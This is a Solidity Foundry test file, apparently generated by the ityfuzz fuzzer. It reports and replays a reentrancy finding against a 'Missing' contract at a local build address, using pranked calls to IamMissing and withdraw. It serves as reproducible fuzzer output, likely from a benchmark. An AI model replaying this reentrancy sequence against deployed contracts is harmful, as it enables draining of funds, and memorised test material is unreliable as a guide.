// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -t './build/*' -f
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy on "build/Missing(0x887db5715868498cff494b5dcc8eda6ce5b7652a)" at slot 0
================ Trace ================
   │  [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   │  │  ├─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.IamMissing()
   │  │  │  │  ├─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.withdraw()
   │  │  │  │  │  ├─[6] [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  │  │  │  │  [Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   │  │  │  │  │  │  ├─[7] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.IamMissing()
   │  │  │  │  │  │  └─[7] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.fallback()
   │  │  │  [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   │  │  │  │  └─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.IamMissing()


 */

contract Build is Test {
    function setUp() public {
    }

    function test() public {
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).IamMissing();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).withdraw();
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).IamMissing();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).IamMissing();
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function withdraw() external payable;
    function IamMissing() external payable;
}
